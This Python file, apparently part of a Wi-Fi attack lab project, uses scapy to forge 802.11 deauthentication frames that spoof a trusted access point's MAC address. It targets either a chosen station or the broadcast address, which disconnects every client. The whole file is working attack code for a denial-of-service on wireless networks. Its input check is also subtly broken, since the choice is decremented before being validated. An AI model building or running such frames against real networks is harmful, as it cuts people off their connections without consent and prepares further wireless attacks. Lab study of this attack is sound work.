from scapy.all import *
from scapy.layers.dot11 import *
import os
import attackerDevice.utils as utils

data = utils.load_json()
#with open("devices.json", "r") as file:
#    data = json.load(file)

# MACS
AP_MAC = utils.get_mac("TrustedAP")[0]
STA_MACS = utils.get_mac("STA")

def deauth_frame(target_mac):
    # Create a deauthentication frame
    frameFCS = ( 
        Dot11FCS(
            proto = 0,
            type=0,
            subtype=12,
            FCfield = None,
            addr1=target_mac,
            addr2=AP_MAC,
            addr3=AP_MAC,
            SC=(1 << 4)
            ) /
        Dot11Deauth(reason=3)
    )

    return bytes(frameFCS)

def start_deauthentication_frame_generator():
    print("\nstart deauthentication frame generator")
    use_defaults = input("use default values for STA? (deauthentication all devices) (y/n): ")

    while(use_defaults not in ["y", "n"]):
        use_defaults = input("Invalid input. Please enter 'y' for yes or 'n' for no: ")
    
    mac_sta = None
    if use_defaults == "y":
        mac_sta = "FF:FF:FF:FF:FF:FF"    
    elif use_defaults == "n":
        print("specify which mac to deauthenticate: ")
        for i in range(len(STA_MACS)):
            print(f"{i+1}: {STA_MACS[i]}")
        mac_choice = int(input("Enter the STA MAC option: "))-1

        while mac_choice not in [i+1 for i in range(len(STA_MACS))]:
            print("Invalid choice. Please enter a valid MAC option from the list.")
            mac_choice = int(input("Enter the STA MAC option: "))-1

        mac_sta = STA_MACS[mac_choice]

    raw_frame = deauth_frame(mac_sta)

    return raw_frame